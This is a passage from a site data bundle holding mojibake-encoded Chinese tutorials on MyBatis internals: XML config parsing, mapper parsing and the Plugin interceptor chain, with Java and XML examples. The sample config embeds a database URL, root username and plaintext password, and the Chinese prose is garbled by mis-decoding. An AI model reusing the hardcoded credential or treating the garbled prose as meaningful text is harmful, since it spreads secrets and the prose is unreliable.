çå·¥ä½æµç¨å¾ï¼å¯¹åºå¾ä¸­ä¼è®²è§£æ¯ä¸ªèç¹éè¦çç¥è¯ç¹ãè¿éè¦è®°ä½ mybatis ä¸»è¦çå·¥ä½æ¨¡å¼å°±æ¯è§£æãåå¤åæ§è¡ï¼æè°è§£æå°±æ¯å¾å° xml çä¿¡æ¯ï¼ç»´æ¤å°ä¸ä¸ªå« configuration çéç½®ç±»ä¸­ï¼åå¤å°±æ¯ opensession é¨åï¼ä»ä¼å¾å° configuration ä¸­çä¿¡æ¯ï¼æ ¹æ®æ§è¡é¨åæä½¿ç¨çæ§è¡å¨ï¼æ°æ®æºï¼äºå¡ç­è¿è¡å®ä¾ååå³ç³»æ å°ï¼ä½¿ç¨å°±æ¯å½æä»¬å»è¿è¡æ¥è¯¢ææ°å¢ç­æä½ï¼ä»èµæºåä¿¡æ¯ä¸­æ¿åå·²è¢«ç¼å­çå¯¹è±¡ææ§è¡å¨ç­ï¼æ§è¡å¯¹åºçæ¹æ³ã\n\n\n\n\n# è§£æ\n\nè§£æé¨åå¯¹åºå¾ä¸­ å è½½&è§£æxml è³ xmlconfigbuilder#mapperelement è¿éï¼å¯ä»¥è¯´æ¯è¯»å xml å°ç»´æ¤åç±»å¯¹è±¡å³ç³»åä¿¡æ¯çæ ¸å¿ãä¸é¢æä»¬åè§£è®²è§£æ¯ä¸ªæ­¥éª¤é½åäºåªäºäºæä»¥åæ ¸å¿é¨åè§£æå¾å°äºä»ä¹ã\n\n\n# å è½½ & è§£æ xml\n\nè¿é¨åä¸»è¦æ¯è¯»å mybatis-config-datasource.xml æä»¶ï¼è¯¥æä»¶ä¸»è¦ç»´æ¤äºä¸äºå¬å±èµæºä¿¡æ¯ï¼åæ¬ç¯å¢ä¿¡æ¯ï¼æ°æ®åºè¿æ¥ä¿¡æ¯ï¼ï¼å¯¹åºç mapper æä»¶ä¿¡æ¯ï¼è®¾ç½®ä¿¡æ¯ç­ã\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype configuration public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    \x3c!-- è®¾ç½®ä¿¡æ¯ --\x3e\n    <settings>\n        \x3c!-- å¨å±ç¼å­ï¼true/false ç®¡çä¸çº§ç¼å­åäºçº§ç¼å­çæ¯å¦ä½¿ç¨ --\x3e\n        <setting name="cacheenabled" value="true"/>\n        \x3c!--ç¼å­çº§å«ï¼session/statement--\x3e\n        <setting name="localcachescope" value="statement"/>\n    </settings>\n    \x3c!-- ç¯å¢ä¿¡æ¯ --\x3e\n    <environments default="development">\n        <environment id="development">\n            <transactionmanager type="jdbc"/>\n            <datasource type="pooled">\n                <property name="driver" value="com.mysql.jdbc.driver"/>\n                <property name="url" value="jdbc:mysql://10.240.30.93:3306/test?useunicode=true&amp;characterencoding=utf8&amp;usessl=false"/>\n                <property name="username" value="root"/>\n                <property name="password" value="dev@root2021"/>\n            </datasource>\n        </environment>\n    </environments>\n    \x3c!-- ç»´æ¤ææmapper --\x3e\n    <mappers>\n        \x3c!-- xml éç½® --\x3e\n        <mapper resource="mapper/activity_mapper.xml"/>\n    </mappers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nè¯»åå°æä»¶åè°ç¨ xmlconfigbuilder#parse è¿è¡è§£æï¼è§£æåå®¹å¦ä¸ã\n\n# configuration åå§åéç½®\n\nå¨æ´ä¸ªæä»¶è§£æä¹åï¼mybatis ä¼åæä¸äºä¿¡æ¯è¿è¡æååå§åï¼ä¹å°±æ¯ä¸å¾ä¸­ new configurationï¼ï¼ é¶æ®µï¼è¯¥ç±»æç»ä¼è¢«å¤ä¸ª mybatis çç±»æå¼ç¨å¹¶è´¯ç©¿æ´ä¸ª mybatis å·¥ä½æµç¨ï¼ç±äºè¢«å¼ç¨çç±»å¤ªå¤ï¼è¿éå°±ä¸ä¸ä¸åä¸¾ï¼æä»¬åªè¦ç¥éä»è´¯ç©¿æ´ä¸ªæµç¨å³å¯ã\n\n\n\nconfiguration è¢«åå§åæ¶åå«äºå¤§éçä¿¡æ¯ï¼è¿äºä¿¡æ¯å°±æ¯å¨è§£æ xml æä»¶æ¶ç»´æ¤çï¼éä¸è®²è§£ä¸æ¯ä¸ªéç½®çå·ä½ä½ç¨ï¼\n\n * environmentï¼ç¼å­äºç¯å¢ idï¼å¯è®¾ç½®é»è®¤ç¯å¢ï¼ç¯å¢åæ¬ï¼å¼åç¯å¢ãæµè¯ç¯å¢ç­ï¼ï¼äºå¡å·¥åï¼æ°æ®æºï¼ææ± ææ æ± æå¶ä»è¿æ¥æ± ï¼ç­\n * mapperregistryï¼æ å°æ³¨åæºï¼ç¼å­æ¯ä¸ªæ¥å£ï¼ æ¥å£å¯¹è±¡classåä¸ºkey ï¼æå¯¹åºç mapperproxyfactory ï¼æä¾æ·»å æ å°ä»£çç±»åè·åä»£çç±»\n * mappedstatementsï¼ç¼å­ sql è¯­å¥çæè§£ä¿¡æ¯ãxml ç namespace.æ ç­¾idåä¸ºï¼keyï¼ ï¼value ä¸º mappedstatementï¼ä¿¡æ¯åæ¬ï¼ mapperè·¯å¾ ï¼ sqlç±»åï¼select|insertç­ï¼ ï¼ sqlè¯­å¥ ï¼ æ¡ä»¶ ï¼ è¯¥æ¡è¯­å¥çç¼å­ä¿¡æ¯ ï¼ è¿åç»æå¯¹è±¡ ï¼ æ¯å¦ç¼å­æ å¿ ç­ã\n * resultmapsï¼ç¼å­ resultmap æ ç­¾çæè§£ä¿¡æ¯ãxml ç namespace.resultmapåä¸ºï¼keyï¼ ï¼ç¶åå¯¹åº value å­æ¾ sqlå­æ®µï¼æ å°å¯¹è±¡å­æ®µï¼å­æ®µjavaæ°æ®ç±»åï¼ç±»åå¯¹åºçæ§è¡å¨ ç­\n * interceptorchainï¼ç¼å­ plugins æ ç­¾çæè§£ä¿¡æ¯ãä¼å¨æ§è¡ newparameterhandlerï¼newresultsethandlerï¼newstatementhandlerï¼newexecutor è¿è¡æ¦æªã\n * typealiasregistryï¼ç¼å­äºæ¯ä¸ª java åºæ¬ç±»åçå°è£ç±»ï¼ä»¥å jdbctransactionfactoryï¼druiddatasourcefactoryï¼unpooleddatasourcefactoryï¼pooleddatasourcefactoryï¼perpetualcacheï¼fifocache ç­ mybatis æä¾çå·²ç¥ç±»ï¼ç¨äºå¿«éè§£æ xml æè¿°çå¼ï¼ä¾¿äºå¿«éå¾å° class ä¿¡æ¯å¹¶è·åå®ä¾ã\n * typehandlerregistryï¼å­æ¾å¯¹åºæ°æ®ç±»åçå¤çç­ç¥ï¼æ¯å¦ java ç±»åï¼å¯¹åº sql ç±»åçå¤çç­ç¥ï¼æ java ç±»åå¯¹åºçå¤çç­ç¥ãç¨äºè®¾ç½® sql è¯­å¥åæ°åè·åæ¥è¯¢ç»æçæ°æ®ç±»åè½¬æ¢ç­ç¥ã\n * objectfactoryï¼å¯¹è±¡å·¥åï¼ç¨äºåå»ºå¯¹è±¡å®ä¾ï¼ä½¿ç¨åå°ã\n * objectwrapperfactoryï¼å¯¹è±¡åè£å¨ï¼æ¾çï¼è¢«è§£æå¯¹è±¡çå®ä¾ï¼ä»¥åå¯¹åºç setï¼getï¼æé å¨ï¼ç±»åç­ä¿¡æ¯ã objectfactory ä¸ objectwrapperfactory æ¯ä¸º metaobject æä¾æ¯æçï¼ä»¥è§£æå¯¹è±¡ä¿¡æ¯è¿è¡ï¼ç¶åè·åå¯¹è±¡æä¸ªç¹å®å±æ§çæ°æ®ï¼ç¼å­æ¯ä¸ºäºå å¿«è·åéåº¦ï¼å¦æå±æ§ä¹æ¯ä¸ä¸ªå¯¹è±¡åä¼éå½ç¼å­ï¼è·åå¼ä¹ä¼éå½è·åã\n * loadedresourcesï¼å­æ¾å·²è¢«å è½½ç mapper.xml æä»¶ï¼ä»¥é²æ­¢éå¤å è½½\n * languageregistryï¼å­æ¾é»è®¤çè¯­è¨è§£æé©±å¨å¨ï¼æ¯å¦å­æ¾äº xmllanguagedriver ï¼æä¾å¿«éè·åè¿ä¸ªè§£æå¨ï¼ç¶åæä¾ sql è§£æã\n * cacheenabledï¼è§£ææ¯å¦å¯ç¨ç¼å­ï¼è¯¥éç½®å¯¹äºäºçº§ç¼å­çæï¼ä¸æ¬¡ç¼å­æ¯é»è®¤ç¼å­ã\n * localcachescopeï¼ä¸çº§ç¼å­ï¼ç¼å­ç­ç¥é»è®¤æ¯æ°¸ä¹ç¼å­ï¼ç¼å­æ¹å¼åä¸º session å statement ï¼ session å¨è¯¥ä¼è¯ä¸­å½ä¸­ç¸å sql è¯­å¥åæ¡ä»¶ï¼è¥å¨è¯¥ session ä¸­åç insert/update/delete/commit/rollback/close åä¼æ¸é¤ç¼å­ï¼ä½æ¯ï¼å¹¶ä¸ä¼å½±åå¶å®ä¼è¯ä¸­çç¼å­ï¼ statement ï¼åªéå¯¹å½åä¼è¯æ§è¡çè¿ä¸è¯­å¥ææï¼æ§è¡å®æ¯æ¥è¯¢ä¼ç«å³æ¸é¤ç¼å­ã\n * cachesï¼äºçº§ç¼å­ï¼åºäº namespace çç¼å­ï¼å¯æä¾ç¬¬ä¸æ¹å¶ä»æ¹å¼å®ç°ã\n\n# environments ç¯å¢è§£æ\n\nå¨ç¯å¢è§£æè¿ç¨ä¸­ä¼å¾å°ä¸é¢å ä¸ªéè¦çå±æ§ï¼\n\n * idï¼è¡¨æä½¿ç¨åªä¸ä¸ªç¯å¢åä¸ºä¸»è¦ç¯å¢éç½®ï¼è§£æ xml ä¸­ç <environment > æ ç­¾\n * transactionfactoryï¼è§£æ xml ä¸­ç <transactionmanager> ç type å±æ§ï¼å¦ææ¯ jdbc åå°±æ¯ jdbctransactionfactory ï¼ä¹å¯ä»¥èªè¡è®¾ç½®ï¼éè¦èªå·±æ³¨åå° typealiasregistry ä¸­\n * datasourcefactoryï¼è§£æ xml ä¸­ <datasource> ç type å±æ§ï¼å¦ææ¯ pooled ï¼åå¯¹åº pooleddatasourcefactory ï¼ unpooled å¯¹åº unpooleddatasourcefactory ï¼ druid å¯¹åº druiddatasourcefactory\n * datasourceï¼è§£æ xml ä¸­ <property> å¾å°å·ä½çè¿æ¥ä¿¡æ¯ï¼ä» datasourcefactory ä¸­è·å datasource\n\nå½ä»¥ä¸çä¿¡æ¯ç»ä»¶å®æ¯åä¼å°è£å° environment ä¸­ï¼ç¶åæ·»å å° configuration\n\n# mapper è§£æ\n\nå¨ mapper è§£æä¸­æä¸¤ç§ä¸åçè§£æï¼ä¸ä¸ªæ¯æä»¬å¸¸è§ç xml è§£æï¼ä¸ç§æ¯æ³¨è§£ï¼å¦ @selectï¼è¿éåªè®² xml è§£æï¼æå³ @select ç­æ³¨è§£è§£æï¼æ¾å¨åç»­ä¸å¼ä¸ç« ãé£è§£æé¦åä¼è¯»åæå°ææç mapperï¼å¨åå«è§£ææ¯ä¸ª mapper\n\n    <mappers>\n        \x3c!-- xml éç½® --\x3e\n        <mapper resource="mapper/activity_mapper.xml"/>\n    </mappers>\n\n\n1\n2\n3\n4\n\n\nä¸ä¸ªå®æ´ç mapper å¤§è´åå«å¦ä¸ä¿¡æ¯ï¼æä»¥åé¨ä¼æå¤ä¸ªè§£æåå«è§£æï¼å¦ cache è§£æï¼resultmap è§£æï¼select è§£æï¼insert è§£æç­ï¼æä»¬è¿éè¯´ä¸éè¦çè§£æå¯¹è±¡åä½ç¨å³å¯ã\n\n<mapper namespace="cn.bugstack.mybatis.test.dao.iactivitydao">\n    <cache eviction="fifo" flushinterval="600000" size="512" readonly="true"/>\n    <resultmap id="activitymap" type="cn.bugstack.mybatis.test.po.activity">\n        <id column="id" property="id"/>\n        <result column="activity_id" property="activityid"/>\n        <result column="activity_name" property="activityname"/>\n        <result column="activity_desc" property="activitydesc"/>\n        <result column="create_time" property="createtime"/>\n        <result column="update_time" property="updatetime"/>\n    </resultmap>\n    <select id="queryactivitybyid" parametertype="cn.bugstack.mybatis.test.po.activity" resultmap="activitymap" flushcache="false" usecache="true">\n        select activity_id, activity_name, activity_desc, create_time, update_time\n        from activity\n        <trim prefix="where" prefixoverrides="and | or" suffixoverrides="and">\n            <if test="null != activityid">\n                activity_id = #{activityid}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<cache > æ ç­¾éç½®äºäºçº§ç¼å­ï¼å¯¹äºç¼å­ä¹ä¼æåç¬çä¸ç« è®²è§£ï¼è¿éåªè®²è§£æå¾å°çéè¦ç±»åä½ç¨ï¼éè¿æ ç­¾ä¼å°è£ä¸ä¸ª cache å¯¹è±¡ï¼è¯¥å¯¹è±¡ä»¥ namespace åä¸º cache ç id ï¼å¹¶æ cache å¯¹è±¡æ·»å å° configuration ä¸­\n\n<resultmap> æ ç­¾éç½®ä¸ä¸ª <select > æ ç­¾ç resultmap å±æ§è¿åç»æå¯¹è±¡çå³ç³»æ å°ï¼ä»ä¼å¾å°å¯¹è±¡ä»¥åå¾å°æè¿°çå java å±æ§ç±»ååå¯¹åºç typehandler ç±»åå¤çå¨ï¼å¨è¿åçæ¶åä½¿ç¨ç±»åå¤çå¨ï¼å¤çæ¥è¯¢è¿åç»æçæ°æ®ç±»åå¯¹åº java çæ å°ã <resultmap> æ ç­¾å¯ä»¥æå¤ä¸ªï¼æä»¥ä¼æ·»å å°éåä¸­ï¼ç¶åç»´æ¤å° configuration ä¸­\n\n<select> or <insert> è¿éæä¸»è¦çé¨åå°±æ¯å¨è§£æå®æåä¼æ namespace.id åä¸º key ï¼æè§£æçä¿¡æ¯ mappedstatement åä¸º value ï¼ç»´æ¤å° configuration ä¸­ï¼ä»¥ä¾¿ mybatis å¨è¢«ä»£çç±»è°ç¨æ¹æ³çæ¶åå¿«éæ¾å°ï¼è¯¥æ¹æ³å¯¹åºç sql ä¿¡æ¯ç­\n\n# plugins æä»¶è§£æ\n\n# settings è®¾ç½®è§£æ\n\n\n# åå¤\n\n\n# æ§è¡',charsets:{cjk:!0}},{title:"æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°",frontmatter:{title:"æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/301/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/30.Mybatis/31.mybatis/301.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20Plugin%E6%8F%92%E4%BB%B6%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0.html",relativePath:"00.java/30.Mybatis/31.mybatis/301.æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°.md",key:"v-6d19a90e",path:"/mybatis/mybatis/301/",headers:[{level:2,title:"è§£æ",slug:"è§£æ",normalizedTitle:"è§£æ",charIndex:38},{level:2,title:"æ³¨å",slug:"æ³¨å",normalizedTitle:"æ³¨å",charIndex:42},{level:2,title:"æ§è¡",slug:"æ§è¡",normalizedTitle:"æ§è¡",charIndex:46},{level:2,title:"èªå®ä¹",slug:"èªå®ä¹",normalizedTitle:"èªå®ä¹",charIndex:5721}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"è§£æ æ³¨å æ§è¡ èªå®ä¹",content:'Mybatis Plugin æ¯éç Mybatis çå·¥ä½æµç¨ä¸èµ·è¢«è¿è¡ è§£æ->æ³¨å->æ§è¡ çï¼äºè§£æ¯ä¸ªæ­¥éª¤æè½æ´å¥½çå¯¹ Mybatis ææä¾ç Plugin æºå¶è¿è¡å®ç°åæ©å±ãå¨æä»¬å·²ç¥ç Mybatis çæä»¶æåé¡µæä»¶ãç¼å­æä»¶ç­ï¼ä¹æä»¥å¯ä»¥è½åå°æ©å±æ¯å ä¸ºä»å¨èªå·±æ¬èº«ç Executorï¼çäº§æ§è¡å¨ï¼ ï¼ StatementHandlerï¼è¯­å¥å¤çå¨ï¼ ï¼ ParameterHandlerï¼åæ°å¤çå¨ï¼ ï¼ ResultSetHandlerï¼ç»æéå¤çå¨ï¼ è¿åä¸ªå°æ¹åäºæ¦æªï¼å½ä»ç»å°æ§è¡æ­¥éª¤çæ¶åå°±å¯ä»¥çå°å·ä½å®ç°ã\n\n\n# è§£æ\n\nå¸¸è§ç XML éç½®\n\n<plugins>\n    <plugin interceptor="cn.mybatis.test.plugin.TestPlugin">\n        <property name="test00" value="100"/>\n        <property name="test01" value="200"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n\n\næ ¸å¿è§£ææ¹æ³\n\nprivate void pluginElement(Element parent) throws Exception {\n    if (parent == null) return;\n    List<Element> elements = parent.elements();\n    for (Element element : elements) {\n        // è§£æç±»è·¯å¾\n        String interceptor = element.attributeValue("interceptor");\n        // åæ°éç½®\n        Properties properties = new Properties();\n        List<Element> propertyElementList = element.elements("property");\n        for (Element property : propertyElementList) {\n            properties.setProperty(property.attributeValue("name"), property.attributeValue("value"));\n        }\n        // è·åæä»¶å®ç°ç±»å¹¶å®ä¾åï¼cn.mybatis.test.plugin.TestPlugin \n        // éè¿ Resources.classForName(string) è·åå®ä¾\n        Interceptor interceptorInstance = (Interceptor) resolveClass(interceptor).newInstance();\n        // è®¾ç½®éç½®å±æ§\n        interceptorInstance.setProperties(properties);\n        // æ³¨åå° configuration ä¸­\n        configuration.addInterceptor(interceptorInstance);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# æ³¨å\n\nè§£æçæ¶åä¼å¨æ¹æ³åé¨æ§è¡ configuration.addInterceptor(interceptorInstance); è¿ä¸æ­¥æ¯ææä»¶ç»´æ¤å° Configuration å¨å±éç½®ä¸­ï¼ä½æä»¶å¶å®åºè¯¥æå¾å¤åï¼æä»¥æä¾çæ¯ä¸ä¸ª InterceptorChain å¯¹è±¡ç± Configuration ç»´æ¤\n\npublic class Configuration {\n    // æä»¶æ¦æªå¨é¾\n    protected final InterceptorChain interceptorChain = new InterceptorChain();\n    public void addInterceptor(Interceptor interceptorInstance) {\n        interceptorChain.addInterceptor(interceptorInstance);\n    }\n    // other å¶ä»éç½®\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nInterceptorChain éé¢ç»´æ¤çæ¯ä¸ä¸ªéåï¼ä¸é¨å­æ¾ææç Plugin\n\npublic class InterceptorChain {\n    // æä»¶æ¦æªå¨å®¹å¨\n    private final List<Interceptor> interceptors = new ArrayList<>();\n    //\n    public Object pluginAll(Object target) {\n        for (Interceptor interceptor : interceptors) {\n            target = interceptor.plugin(target);\n        }\n        return target;\n    }\n    // æ·»å å°æä»¶å®¹å¨\n    public void addInterceptor(Interceptor interceptor) {\n        interceptors.add(interceptor);\n    }\n    public List<Interceptor> getInterceptors(){\n        return Collections.unmodifiableList(interceptors);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä»è§£æå°æ³¨åè¿ä¸¤æ­¥å°±å¯ä»¥çåºï¼MyBatis æ¯ææä»¶ä»¥æ¦æªå¨çå½¢å¼å­æ¾å°ä¸ä¸ªæ¦æªå¨å®¹å¨éï¼è¿ä¸ªå®¹å¨æ¯ Configuration å¨å±éç½®ç±»æ¥è¿è¡ç»´æ¤ç\n\n\n# æ§è¡\n\næ§è¡æ¯å¨è°ç¨å·ä½çæ¥è¯¢æ¹æ³æ´»å¶ä»å¨ Mybatis éææè¿°ç SQL æ¹æ³æ¶è¿è¡çè§¦åï¼è§¦åä¼å¨å¦ä¸ä»£ç ä¸­çä½ç½®ä¸­è§¦åã\n\n  // åå»ºåæ°å¤çå¨\n  public ParameterHandler newParameterHandler(MappedStatement mappedStatement, Object parameterObject, BoundSql boundSql) {\n    ParameterHandler parameterHandler = mappedStatement.getLang().createParameterHandler(mappedStatement, parameterObject, boundSql);\n    parameterHandler = (ParameterHandler) interceptorChain.pluginAll(parameterHandler);\n    return parameterHandler;\n  }\n \n  // åå»ºç»æéå¤çå¨\n  public ResultSetHandler newResultSetHandler(Executor executor, MappedStatement mappedStatement, RowBounds rowBounds, ParameterHandler parameterHandler,\n      ResultHandler resultHandler, BoundSql boundSql) {\n    ResultSetHandler resultSetHandler = new DefaultResultSetHandler(executor, mappedStatement, parameterHandler, resultHandler, boundSql, rowBounds);\n    resultSetHandler = (ResultSetHandler) interceptorChain.pluginAll(resultSetHandler);\n    return resultSetHandler;\n  }\n \n  // åå»ºè¯­å¥å¤çå¨\n  public StatementHandler newStatementHandler(Executor executor, MappedStatement mappedStatement, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) {\n    StatementHandler statementHandler = new RoutingStatementHandler(executor, mappedStatement, parameterObject, rowBounds, resultHandler, boundSql);\n    statementHandler = (StatementHandler) interceptorChain.pluginAll(statementHandler);\n    return statementHandler;\n  }\n\n  // çäº§æ§è¡å¨\n  public Executor newExecutor(Transaction transaction, ExecutorType executorType) {\n    executorType = executorType == null ? defaultExecutorType : executorType;\n    executorType = executorType == null ? ExecutorType.SIMPLE : executorType;\n    Executor executor;\n    if (ExecutorType.BATCH == executorType) {\n      // æ¹éå¤çå¨\n      executor = new BatchExecutor(this, transaction);\n    } else if (ExecutorType.REUSE == executorType) {\n      executor = new ReuseExecutor(this, transaction);\n    } else {\n      // ç®åå¤çå¨\n      executor = new SimpleExecutor(this, transaction);\n    }\n    // äºçº§ç¼å­å¤çå¨\n    if (cacheEnabled) {\n      executor = new CachingExecutor(executor);\n    }\n    executor = (Executor) interceptorChain.pluginAll(executor);\n    return executor;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\nä¼çå°ä»ä¼è°ç¨ InterceptorChain#pluginAll æ¹æ³ï¼è¯¥ç±»å¨æ³¨åæ­¥éª¤ä¸­ææåå°ï¼éé¢ç»´æ¤äºææçæä»¶ï¼é£ä¹å¨è¿éå°±ä¼æ¶å¾ªç¯ææçæä»¶ï¼æ¯ä¸ªæä»¶è°ç¨ Interceptor#plugin\n\n// å¾ªç¯è°ç¨\npublic Object pluginAll(Object target) {\n    for (Interceptor interceptor : interceptors) {\n        target = interceptor.plugin(target);\n    }\n    return target;\n}\n\n// æ§è¡wrap\npublic interface Interceptor {\n    // æ¦æªï¼ä½¿ç¨æ¹å®ç°\n    Object intercept(Invocation invocation) throws Throwable;\n    // ä»£ç\n    default Object plugin(Object target) {\n        return Plugin.wrap(target, this);\n    }\n    // è®¾ç½®å±æ§\n    default void setProperties(Properties properties) {\n        // NOP\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nInterceptor#plugin æ¹æ³åé¨ä¹å°±æ¯è°ç¨ Plugin#wrap éææ¹æ³ï¼è¯¥æ¹æ³éè¿è·åèªå®ä¹æä»¶çæ³¨è§£ï¼æ¥è§å¯ä½ éè¦å¯¹åªä¸ªå¤çå¨ï¼åªä¸ªæ¹æ³ä»¥ååæ°ç±»åå»å¹éæ¦æªå¯¹è±¡çå·ä½æ¹æ³ï¼å¦æå¤ä¸ä¸ªåæ°é½å¯è½æ¾ä¸å°è¦æ¦æªçæ¹æ³ãæ¾å°æ¹æ³åç¶åå»å¨æä»£çè¿ä¸ªæ¹æ³ã\n\n// \npublic class Plugin implements InvocationHandler {\n    private Object target;\n    private Interceptor interceptor;\n    private Map<Class<?>, Set<Method>> signatureMap;\n\n    private Plugin(Object target, Interceptor interceptor, Map<Class<?>, Set<Method>> signatureMap) {\n        this.target = target;\n        this.interceptor = interceptor;\n        this.signatureMap = signatureMap;\n    }\n    // å·ä½çä»£çå®ç°\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        // è·åå£°æçæ¹æ³åè¡¨\n        Set<Method> methods = signatureMap.get(method.getDeclaringClass());\n        // è¿æ»¤éè¦æ¦æªçæ¹æ³\n        if (methods != null && methods.contains(method)) {\n            // è°ç¨ Interceptor#intercept æå¥èªå·±çåå°é»è¾\n            return interceptor.intercept(new Invocation(target, method, args));\n        }\n        return method.invoke(target, args);\n    }\n    /**\n     * ç¨ä»£çæèªå®ä¹æä»¶è¡ä¸ºåè£¹å°ç®æ æ¹æ³ä¸­ï¼ä¹å°±æ¯ Plugin.invoke çè¿æ»¤è°ç¨\n     */\n    public static Object wrap(Object target, Interceptor interceptor) {\n        // åå¾ç­¾åMap\n        Map<Class<?>, Set<Method>> signatureMap = getSignatureMap(interceptor);\n        // åå¾è¦æ¹åè¡ä¸ºçç±»(ParameterHandler|ResultSetHandler|StatementHandler|Executor)\n        Class<?> type = target.getClass();\n        // åå¾æ¥å£\n        Class<?>[] interfaces = getAllInterfaces(type, signatureMap);\n        // åå»ºä»£ç(StatementHandler)\n        if (interfaces.length > 0) {\n            // ä»£ç\n            return Proxy.newProxyInstance(\n                    type.getClassLoader(),\n                    interfaces,\n                    new Plugin(target, interceptor, signatureMap));\n        }\n        return target;\n    }\n    /**\n     * è·åæ¹æ³ç­¾åç» Map\n     */\n    private static Map<Class<?>, Set<Method>> getSignatureMap(Interceptor interceptor) {\n        // å Intercepts æ³¨è§£\n        Intercepts interceptsAnnotation = interceptor.getClass().getAnnotation(Intercepts.class);\n        // å¿é¡»å¾æ Intercepts æ³¨è§£ï¼æ²¡ææ¥é\n        if (interceptsAnnotation == null) {\n            throw new RuntimeException("No @Intercepts annotation was found in interceptor " + interceptor.getClass().getName());\n        }\n        // valueæ¯æ°ç»åï¼Signatureçæ°ç»\n        Signature[] sigs = interceptsAnnotation.value();\n        // æ¯ä¸ª class ç±»æå¤ä¸ªå¯è½æå¤ä¸ª Method éè¦è¢«æ¦æª\n        Map<Class<?>, Set<Method>> signatureMap = new HashMap<>();\n        for (Signature sig : sigs) {\n            Set<Method> methods = signatureMap.computeIfAbsent(sig.type(), k -> new HashSet<>());\n            try {\n                // ä¾å¦è·åå°æ¹æ³ï¼StatementHandler.prepare(Connection connection)ãStatementHandler.parameterize(Statement statement)...\n                Method method = sig.type().getMethod(sig.method(), sig.args());\n                methods.add(method);\n            } catch (NoSuchMethodException e) {\n                throw new RuntimeException("Could not find method on " + sig.type() + " named " + sig.method() + ". Cause: " + e, e);\n            }\n        }\n        return signatureMap;\n    }\n    /**\n     * åå¾æ¥å£\n     */\n    private static Class<?>[] getAllInterfaces(Class<?> type, Map<Class<?>, Set<Method>> signatureMap) {\n        Set<Class<?>> interfaces = new HashSet<Class<?>>();\n        while (type != null) {\n            for (Class<?> c : type.getInterfaces()) {\n                // æ¦æª ParameterHandler|ResultSetHandler|StatementHandler|Executor\n                if (signatureMap.containsKey(c)) {\n                    interfaces.add(c);\n                }\n            }\n            type = type.getSuperclass();\n        }\n        return interfaces.toArray(new Class<?>[interfaces.size()]);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n\n# èªå®ä¹\n\npackage cn.mybatis.test.plugin;\n\nimport cn.mybatis.executor.statement.StatementHandler;\nimport cn.mybatis.mapping.BoundSql;\nimport cn..mybatis.plugin.Interceptor;\nimport cn.mybatis.plugin.Intercepts;\nimport cn.mybatis.plugin.Invocation;\nimport cn.mybatis.plugin.Signature;\n\nimport java.sql.Connection;\nimport java.util.Properties;\n\n@Intercepts({@Signature(type = StatementHandler.class, method = "prepare", args = {Connection.class})})\npublic class TestPlugin implements Interceptor {\n\n    @Override\n    public Object intercept(Invocation invocation) throws Throwable {\n        // è·åStatementHandler\n        StatementHandler statementHandler = (StatementHandler) invocation.getTarget();\n        // è·åSQLä¿¡æ¯\n        BoundSql boundSql = statementHandler.getBoundSql();\n        String sql = boundSql.getSql();\n        // è¾åºSQL\n        System.out.println("æ¦æªSQLï¼" + sql);\n        // æ¾è¡\n        return invocation.proceed();\n    }\n\n    @Override\n    public void setProperties(Properties properties) {\n        System.out.println("åæ°è¾åºï¼" + properties.getProperty("test00"));\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',normalizedContent:'mybatis plugin æ¯éç mybatis çå·¥ä½æµç¨ä¸èµ·è¢«è¿è¡ è§£æ->æ³¨å->æ§è¡ çï¼äºè§£æ¯ä¸ªæ­¥éª¤æè½æ´å¥½çå¯¹ mybatis ææä¾ç plugin æºå¶è¿è¡å®ç°åæ©å±ãå¨æä»¬å·²ç¥ç mybatis çæä»¶æåé¡µæä»¶ãç¼å­æä»¶ç­ï¼ä¹æä»¥å¯ä»¥è½åå°æ©å±æ¯å ä¸ºä»å¨èªå·±æ¬èº«ç 